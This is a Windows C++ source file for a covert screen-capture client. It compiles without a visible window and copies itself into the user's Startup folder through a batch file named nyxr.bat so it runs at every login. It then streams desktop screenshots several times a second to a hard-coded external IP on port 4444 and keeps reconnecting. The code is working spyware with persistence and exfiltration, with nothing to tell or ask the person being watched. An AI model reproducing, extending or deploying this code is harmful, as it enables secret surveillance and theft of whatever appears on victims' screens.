// client.cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <string>
#include <thread>
#include <fstream>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

const char* SERVER1 = "212.35.189.7";
const char* SERVER2 = "192.168.0.104";
const int PORT = 4444;

void AddToStartup() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string startup = std::string(getenv("USERPROFILE")) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
    std::ofstream bat(startup);
    bat << "@echo off\nstart \"\" \"" << path << "\"";
    bat.close();
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* pCodecInfo = (Gdiplus::ImageCodecInfo*)malloc(size);
    Gdiplus::GetImageEncoders(num, size, pCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pCodecInfo[j].Clsid;
            free(pCodecInfo);
            return j;
        }
    }
    free(pCodecInfo);
    return -1;
}

bool SendAll(SOCKET sock, const char* data, int len) {
    int total = 0;
    while (total < len) {
        int sent = send(sock, data + total, len - total, 0);
        if (sent <= 0) return false;
        total += sent;
    }
    return true;
}

void SendScreenLoop() {
    // Initialize GDI+ once
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    CLSID jpegClsid;
    GetEncoderClsid(L"image/jpeg", &jpegClsid);

    while (true) {
        // ---------- Connect to server ----------
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            WSACleanup();
            Sleep(5000);
            continue;
        }

        sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        // Try both IPs
        if (inet_pton(AF_INET, SERVER1, &addr.sin_addr) <= 0) {
            inet_pton(AF_INET, SERVER2, &addr.sin_addr);
        }

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
            closesocket(sock);
            WSACleanup();
            Sleep(5000); // wait 5 seconds before retry
            continue;
        }

        // ---------- Send screenshots in a loop ----------
        while (true) {
            HWND hwnd = GetDesktopWindow();
            HDC hdc = GetDC(hwnd);
            RECT rect;
            GetClientRect(hwnd, &rect);
            int w = rect.right, h = rect.bottom;

            HDC hdcMem = CreateCompatibleDC(hdc);
            HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
            SelectObject(hdcMem, hBitmap);
            BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

            Gdiplus::Bitmap bitmap(hBitmap, NULL);
            DeleteObject(hBitmap);
            DeleteDC(hdcMem);
            ReleaseDC(hwnd, hdc);

            IStream* pStream = NULL;
            CreateStreamOnHGlobal(NULL, TRUE, &pStream);
            bitmap.Save(pStream, &jpegClsid, NULL);

            STATSTG stat;
            pStream->Stat(&stat, STATFLAG_NONAME);
            ULONG jpegSize = stat.cbSize.LowPart;
            BYTE* jpegData = new BYTE[jpegSize];
            LARGE_INTEGER li = {};
            pStream->Seek(li, STREAM_SEEK_SET, NULL);
            ULONG bytesRead;
            pStream->Read(jpegData, jpegSize, &bytesRead);
            pStream->Release();

            // Send length + data
            if (!SendAll(sock, (char*)&jpegSize, 4) ||
                !SendAll(sock, (char*)jpegData, jpegSize)) {
                delete[] jpegData;
                break; // connection lost, exit inner loop
            }
            delete[] jpegData;

            Sleep(180);
        }

        closesocket(sock);
        WSACleanup();
        // If we reach here, the connection was lost; loop will try to reconnect
        Sleep(3000);
    }

    Gdiplus::GdiplusShutdown(gdiplusToken);
}

int main() {
    AddToStartup();
    SendScreenLoop();   // this never returns
    return 0;
}